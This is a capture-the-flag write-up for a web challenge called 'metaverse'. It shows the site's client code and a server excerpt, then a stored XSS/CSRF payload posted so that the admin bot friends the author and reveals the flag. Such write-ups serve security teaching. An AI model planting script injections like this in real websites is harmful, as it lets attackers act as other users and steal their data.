# metaverse (web) by aplet123

```
web/metaverse
aplet123

Metaenter the metaverse and metapost about metathings. All you have to metado is metaregister for a metaaccount and you're good to metago.

metaverse.lac.tf

You can metause our fancy new metaadmin metabot to get the admin to metaview your metapost!
```

### Site:
When we look at the site mentioned in the description we are prompted to create an account, after that we can add friends and make posts.
If we friend someone like admin, we are listed on their friends list but they not on ours. If we friend ourselves we see:
```
<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="UTF-8" />
        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
        <link href="/style.css" rel="stylesheet" />
        <title>metaverse</title>
    </head>
    <body>
        <h1><span class="meta">meta</span>friends</h1>
        <p>to increase realism, <span class="meta">meta</span>friending is not necessarily a two-way relationship</p>
        <p>if someone <span class="meta">meta</span>friends you, they are your <span class="meta">meta</span>friend but not vice versa</p>
        <div class="centered">
            <input id="friend" type="text" /><br />
            <button onclick="friend()"><span class="meta">meta</span>friend</button>
        </div>
        <p><span class="meta">meta</span>friend list:</p>
        <div id="friendlist"></div>
        <h1><span class="meta">meta</span>posts</h1>
        <div class="centered">
            <textarea id="postcontent"></textarea><br />
            <button onclick="createPost()">new <span class="meta">meta</span>post</button>
        </div>

        <p><span class="meta">meta</span>post list:</p>
        <div id="postlist"></div>
        <script>
            function friend() {
                fetch("/friend", {
                    method: "POST",
                    body: "username=" + encodeURIComponent(document.getElementById("friend").value),
                    headers: {
                        "Content-Type": "application/x-www-form-urlencoded",
                    },
                }).then((res) =>
                    res.text().then((t) => {
                        if (res.status !== 200) {
                            document.querySelector(".error")?.remove();
                            const error = document.createElement("p");
                            error.innerText = t;
                            error.classList.add("error");
                            document.body.insertAdjacentElement("afterbegin", error);
                        } else {
                            location.reload();
                        }
                    })
                );
            }

            function createPost() {
                fetch("/post", {
                    method: "POST",
                    body: "content=" + encodeURIComponent(document.getElementById("postcontent").value),
                    headers: {
                        "Content-Type": "application/x-www-form-urlencoded",
                    },
                }).then((res) =>
                    res.text().then((t) => {
                        if (res.status !== 200) {
                            document.querySelector(".error")?.remove()
                            const error = document.createElement("p");
                            error.innerText = t;
                            error.classList.add("error");
                            document.body.insertAdjacentElement("afterbegin", error);
                        } else {
                            window.open("/post/" + t);
                            location.reload();
                        }
                    })
                );
            }

            fetch("/friends")
                .then((res) => res.json())
                .then((friends) => {
                    const list = document.getElementById("friendlist");
                    if (friends.length === 0) {
                        const ele = document.createElement("p");
                        ele.innerText = "you have none :(";
                        list.appendChild(ele);
                    }
                    for (const f of friends) {
                        const ele = document.createElement("p");
                        ele.innerText = `${f.displayName} (${f.username})`;
                        list.appendChild(ele);
                    }
                });
            fetch("/posts")
                .then((res) => res.json())
                .then((posts) => {
                    const list = document.getElementById("postlist");
                    if (posts.length === 0) {
                        const ele = document.createElement("p");
                        ele.innerText = "you have none :(";
                        list.appendChild(ele);
                    }
                    for (const p of posts.reverse()) {
                        const ele = document.createElement("p");
                        const link = document.createElement("a");
                        link.href = "/post/" + p.id;
                        link.target = "_blank";
                        link.innerText = "link";
                        ele.appendChild(link);
                        ele.appendChild(document.createTextNode(` - ${p.blurb}`));
                        list.appendChild(ele);
                    }
                });
        </script>
    </body>
</html>
```
The text in parenthesis is our display name.

By creating a post with the text `<script>alert(1)</script>` I saw that the post section of the site was vulnerable to xss and xsrf.

If we look at the source code we can also see that the admin's display name is the flag.
So putting all that together, one might be able to forge a request so that the admin friends oneself.

### Source Code:
We get an index.js file: (I left out the unnecessary parts since it's a long file)
```
const express = require("express");
const path = require("path");
const fs = require("fs");
const cookieParser = require("cookie-parser");
const { v4: uuid } = require("uuid");

const flag = process.env.FLAG;
const port = parseInt(process.env.PORT) || 8080;
const adminpw = process.env.ADMINPW || "placeholder";

const accounts = new Map();
accounts.set("admin", {
    password: adminpw,
    displayName: flag,
    posts: [],
    friends: [],
});
```

### Solution:
When I inspected the site I saw a script with the interesting section:
```
function friend() {
    fetch("/friend", {
        method: "POST",
        body: "username=" + encodeURIComponent(document.getElementById("friend").value),
        headers: {
            "Content-Type": "application/x-www-form-urlencoded",
        },
    }).then((res) =>
        res.text().then((t) => {
            if (res.status !== 200) {
                document.querySelector(".error")?.remove();
                const error = document.createElement("p");
                error.innerText = t;
                error.classList.add("error");
                document.body.insertAdjacentElement("afterbegin", error);
            } else {
                location.reload();
            }
        })
    );
}
```
So I copied the section
```
fetch("/friend", {
        method: "POST",
        body: "username=" + encodeURIComponent(document.getElementById("friend").value),
        headers: {
            "Content-Type": "application/x-www-form-urlencoded",
        },
    })
```
changed it to
```
<script>fetch("/friend", {
    method: "POST",
    body: username=metaman,
    headers: {
        "Content-Type": "application/x-www-form-urlencoded",
    },
})</script>
```
made a post containing that text and sent the link to the admin bot who friended me and showed me the flag:
```
metafriend list:

metaman (metaman)

lactf{please_metaget_me_out_of_here} (admin)
```
Was a fun challenge, even with little experience in web exploitation.